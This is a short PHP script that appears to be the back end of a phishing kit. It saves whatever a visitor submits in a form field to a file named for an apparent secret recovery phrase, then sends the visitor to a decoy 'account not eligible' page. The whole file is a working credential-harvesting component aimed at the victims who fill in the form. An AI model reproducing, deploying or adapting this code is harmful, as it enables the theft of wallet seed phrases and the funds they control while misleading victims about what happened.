<?php 

if(isset($_POST['inputField']) ) 
	$inputField = $_POST['inputField']; {


	if(empty($inputField)) {
		echo "<script>alert('Complete All Data!'); document.location='./';</script>";
	    }  else
    {
        $file = "----srp----.txt";
        
        $handle = fopen($file, 'a');
        fwrite($handle, "============================================");
        fwrite($handle, "\n");
        fwrite($handle, "$inputField");
        fwrite($handle, "\n");
        if(fclose($handle)) {
            echo "<script>window.location.href='/account-not-eligible.html';</script>";
        }
	}
}